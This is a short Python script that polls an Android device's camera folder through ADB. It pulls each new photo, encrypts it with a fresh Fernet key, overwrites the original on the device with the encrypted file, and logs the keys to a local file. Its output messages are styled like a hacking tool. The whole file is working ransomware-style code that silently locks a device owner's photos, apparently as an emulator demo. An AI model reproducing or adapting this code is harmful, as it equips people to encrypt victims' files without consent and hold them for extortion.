import subprocess
import os
import time
from cryptography.fernet import Fernet

# --- HARDCODED ADB PATH ---
ADB_PATH = r"C:\Users\nehad\AppData\Local\Android\Sdk\platform-tools\adb.exe"
# ---------------------------

# Folder where the emulator stores camera photos (default for Android)
REMOTE_CAMERA_FOLDER = "/sdcard/DCIM/Camera/"
# Local temp folder to pull files
LOCAL_TEMP = "temp_photo.jpg"
KEY_FILE = "secret.key"

def get_photo_list():
    """List all photo files in the emulator's camera folder."""
    result = subprocess.run([ADB_PATH, "shell", "ls", REMOTE_CAMERA_FOLDER], capture_output=True, text=True)
    if result.returncode != 0:
        return []
    # Filter for image files (jpg, jpeg, png) – adjust as needed
    files = result.stdout.splitlines()
    # Remove empty lines and filter extensions
    photos = [f for f in files if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
    return photos

def encrypt_photo(remote_file_path):
    """Pull a photo from the emulator, encrypt it, and push back."""
    print(f"[*] New photo detected: {remote_file_path}")
    
    # 1. Pull the photo
    subprocess.run([ADB_PATH, "pull", remote_file_path, LOCAL_TEMP], check=True)
    
    # 2. Generate key and encrypt
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open(LOCAL_TEMP, "rb") as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    with open(LOCAL_TEMP, "wb") as f:
        f.write(encrypted_data)
    
    # 3. Push back (overwrites the original photo with encrypted version)
    subprocess.run([ADB_PATH, "push", LOCAL_TEMP, remote_file_path], check=True)
    
    # 4. Save the key (append to a log file with filename)
    with open(KEY_FILE, "ab") as f:
        f.write(f"{remote_file_path}: {key.hex()}\n".encode())
    
    print(f"[+] Encrypted: {remote_file_path}")
    os.remove(LOCAL_TEMP)

def main():
    print("[*] Monitoring camera folder for new photos...")
    print("[*] Press Ctrl+C to stop.\n")
    
    # Keep track of already processed files
    seen_photos = set()
    
    try:
        while True:
            current_photos = set(get_photo_list())
            # Find new photos (those not in seen set)
            new_photos = current_photos - seen_photos
            
            for photo in new_photos:
                encrypt_photo(os.path.join(REMOTE_CAMERA_FOLDER, photo))
            
            # Update seen set
            seen_photos = current_photos
            
            # Wait a bit before checking again
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped.")

if __name__ == "__main__":
    main()